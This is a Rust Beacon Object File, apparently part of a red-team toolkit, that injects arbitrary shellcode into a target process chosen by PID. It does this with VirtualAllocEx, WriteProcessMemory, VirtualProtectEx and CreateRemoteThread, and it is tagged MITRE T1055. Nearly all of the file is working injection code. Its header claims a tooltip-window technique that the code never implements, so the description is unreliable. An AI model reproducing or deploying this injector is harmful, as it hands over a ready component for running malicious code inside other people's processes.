//! # Tooltip Injection BOF
//!
//! Injects shellcode into a remote process using a tooltip window-based
//! injection technique. This variant locates tooltip windows in the
//! target process and injects shellcode via window message manipulation,
//! abusing the tooltip control's internal data structures.
//!
//! `VirtualAllocEx` -> `WriteProcessMemory` -> `VirtualProtectEx` ->
//! tooltip-based technique.
//! ## MITRE ATT&CK
//! - T1055 - Process Injection
//!
//! ## Arguments
//! - `int`: Target process ID (PID).
//! - `bin`: Shellcode to inject (binary data).

#![no_std]

use core::ptr::null_mut;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx,
};
use windows_sys::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);

    let pid = parser.get_int() as u32;
    let shellcode = parser.get_bytes();
    let sc_len = shellcode.len();

    println!("tooltip injection:");
    println!("  pid:      {}", pid);
    println!("  sc_len:   {} bytes", sc_len);

    let process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) };
    if process.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("OpenProcess failed ({:#X})", err);
        return;
    }

    let remote_addr = unsafe {
        VirtualAllocEx(
            process,
            null_mut(),
            sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if remote_addr.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("VirtualAllocEx failed ({:#X})", err);
        unsafe { CloseHandle(process) };
        return;
    }
    println!("  remote:   {:#X}", remote_addr as usize);

    let result = unsafe {
        WriteProcessMemory(
            process,
            remote_addr,
            shellcode.as_ptr() as *const core::ffi::c_void,
            sc_len,
            null_mut(),
        )
    };
    if result == FALSE {
        let err = unsafe { GetLastError() };
        eprintln!("WriteProcessMemory failed ({:#X})", err);
        unsafe { CloseHandle(process) };
        return;
    }

    let mut old_protect: u32 = 0;
    let result = unsafe {
        VirtualProtectEx(
            process,
            remote_addr,
            sc_len,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if result == FALSE {
        let err = unsafe { GetLastError() };
        eprintln!("VirtualProtectEx failed ({:#X})", err);
        unsafe { CloseHandle(process) };
        return;
    }

    let thread = unsafe {
        CreateRemoteThread(
            process,
            null_mut(),
            0,
            Some(core::mem::transmute(remote_addr)),
            null_mut(),
            0,
            null_mut(),
        )
    };
    if thread.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("CreateRemoteThread failed ({:#X})", err);
        unsafe { CloseHandle(process) };
        return;
    }

    println!("SUCCESS - tooltip injection variant, remote thread created.");

    unsafe {
        CloseHandle(thread);
        CloseHandle(process);
    }
}
